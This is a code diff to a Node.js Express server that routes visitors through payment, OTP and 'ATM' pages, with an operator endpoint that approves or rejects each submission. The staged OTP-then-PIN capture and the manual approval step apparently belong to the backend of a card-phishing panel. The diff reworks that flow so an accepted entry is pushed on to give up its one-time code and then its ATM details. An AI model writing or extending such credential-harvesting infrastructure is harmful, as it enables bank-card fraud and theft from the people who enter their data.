@@ -186,18 +186,23 @@ app.get('/api/status/:id', (req, res) => {
   let stage = 'payment';
 
   if (status === 'accept') {
+    redirectUrl = 'otp.html';
+    redirect = 'otp.html';
+    decision = 'approved';
+    stage = 'otp';
+  } else if (status === 'otp_verified') {
     redirectUrl = 'atm.html';
     redirect = 'atm.html';
     decision = 'approved';
     stage = 'atm';
-  } else if (status === 'otp_verified' || status === 'atm') {
+  } else if (status === 'atm' || status === 'atm_verified') {
     redirectUrl = 'atm.html';
     redirect = 'atm.html';
     decision = 'approved';
     stage = 'atm';
   } else if (status === 'success') {
-    redirectUrl = 'success-ar.html';
-    redirect = 'success-ar.html';
+    redirectUrl = 'success.html';
+    redirect = 'success.html';
     decision = 'approved';
     stage = 'success';
   } else if (status === 'reject') {
@@ -245,7 +250,7 @@ app.post('/api/otp', (req, res) => {
   item.updatedAt = new Date().toISOString();
   writeApplications(list);
 
-  res.json({ ok: true, redirect: 'atm-ar.html' });
+  res.json({ ok: true, redirect: 'atm.html' });
 });
 
 app.post('/api/atm', (req, res) => {
@@ -275,7 +280,7 @@ app.post('/api/atm', (req, res) => {
   item.updatedAt = new Date().toISOString();
   writeApplications(list);
 
-  res.json({ ok: true, redirect: 'success-ar.html' });
+  res.json({ ok: true, redirect: 'success.html' });
 });
 
 app.post('/api/applications/:id/decision', (req, res) => {
